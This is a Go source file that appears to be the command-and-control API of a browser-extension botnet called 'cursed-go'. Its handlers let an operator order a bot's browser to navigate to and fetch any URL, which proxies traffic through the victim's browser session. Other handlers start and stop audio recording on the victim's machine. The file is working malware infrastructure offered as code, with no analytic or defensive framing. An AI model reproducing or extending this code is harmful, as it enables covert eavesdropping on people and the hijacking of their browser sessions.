package api

import (
	"context"
	"errors"
	"net/http"
	"time"

	"github.com/google/uuid"
	"gorm.io/gorm"

	"github.com/s045pd/cursed-go/internal/db/models"
)

// RemoteAPI groups remote-control + bot-RPC routes.
type RemoteAPI struct {
	DB  *gorm.DB
	RPC BotRPC
}

type remoteCtlReq struct {
	BotID string `json:"bot_id"`
	URL   string `json:"url"`
}

type stopRemoteReq struct {
	BotID string `json:"bot_id"`
}

type audioCtlReq struct {
	BotID string `json:"bot_id"`
}

func (a *RemoteAPI) loadBot(id uuid.UUID) (*models.Bot, error) {
	var b models.Bot
	if err := a.DB.Where("id = ?", id).First(&b).Error; err != nil {
		return nil, err
	}
	return &b, nil
}

// RemoteControl is POST /api/v1/remote-control
func (a *RemoteAPI) RemoteControl(w http.ResponseWriter, r *http.Request) {
	var body remoteCtlReq
	if !MustDecode(w, r, &body) {
		return
	}
	id, err := uuid.Parse(body.BotID)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid bot_id")
		return
	}
	if body.URL == "" {
		JSONErr(w, http.StatusBadRequest, "url required")
		return
	}
	b, err := a.loadBot(id)
	if err != nil {
		JSONErr(w, http.StatusNotFound, "bot not found")
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 35*time.Second)
	defer cancel()
	out, err := a.RPC.CallBot(ctx, b.BrowserID, "TAB_NAVIGATE_AND_FETCH", map[string]any{"url": body.URL})
	if err != nil {
		if errors.Is(err, ErrBotOffline) {
			JSONErr(w, http.StatusBadGateway, "bot offline")
			return
		}
		JSONErr(w, http.StatusGatewayTimeout, err.Error())
		return
	}
	JSONOK(w, out)
}

// StopRemoteControl is POST /api/v1/stop-remote-control
func (a *RemoteAPI) StopRemoteControl(w http.ResponseWriter, r *http.Request) {
	var body stopRemoteReq
	if !MustDecode(w, r, &body) {
		return
	}
	id, err := uuid.Parse(body.BotID)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid bot_id")
		return
	}
	b, err := a.loadBot(id)
	if err != nil {
		JSONErr(w, http.StatusNotFound, "bot not found")
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 5*time.Second)
	defer cancel()
	_, _ = a.RPC.CallBot(ctx, b.BrowserID, "STOP_TAB_NAVIGATE", nil)
	JSONOK(w, struct{}{})
}

// StartAudio is POST /api/v1/start-audio
func (a *RemoteAPI) StartAudio(w http.ResponseWriter, r *http.Request) {
	a.audioCtl(w, r, "START_AUDIO_RECORDING")
}

// StopAudio is POST /api/v1/stop-audio
func (a *RemoteAPI) StopAudio(w http.ResponseWriter, r *http.Request) {
	a.audioCtl(w, r, "STOP_AUDIO_RECORDING")
}

func (a *RemoteAPI) audioCtl(w http.ResponseWriter, r *http.Request, action string) {
	var body audioCtlReq
	if !MustDecode(w, r, &body) {
		return
	}
	id, err := uuid.Parse(body.BotID)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid bot_id")
		return
	}
	b, err := a.loadBot(id)
	if err != nil {
		JSONErr(w, http.StatusNotFound, "bot not found")
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 10*time.Second)
	defer cancel()
	if _, err := a.RPC.CallBot(ctx, b.BrowserID, action, nil); err != nil {
		if errors.Is(err, ErrBotOffline) {
			JSONErr(w, http.StatusBadGateway, "bot offline")
			return
		}
		JSONErr(w, http.StatusGatewayTimeout, err.Error())
		return
	}
	JSONOK(w, struct{}{})
}
